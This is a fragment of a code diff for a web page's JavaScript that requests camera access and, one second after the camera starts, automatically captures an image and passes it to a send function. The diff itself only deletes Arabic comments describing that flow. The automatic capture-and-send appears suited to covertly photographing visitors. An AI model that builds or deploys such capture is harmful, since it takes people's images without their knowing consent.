@@ -12,16 +12,14 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
-    // طلب إذن الكاميرا والتقاط الصورة مباشرة
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // ننتظر قليلًا حتى تعمل الكاميرا، ثم نلتقط الصورة ونرسلها
         video.onloadedmetadata = () => {
           setTimeout(() => {
             captureAndSend();
-          }, 1000); // انتظر 1 ثانية بعد بدء تشغيل الكاميرا
+          }, 1000); 
         };
       })
       .catch(error => {
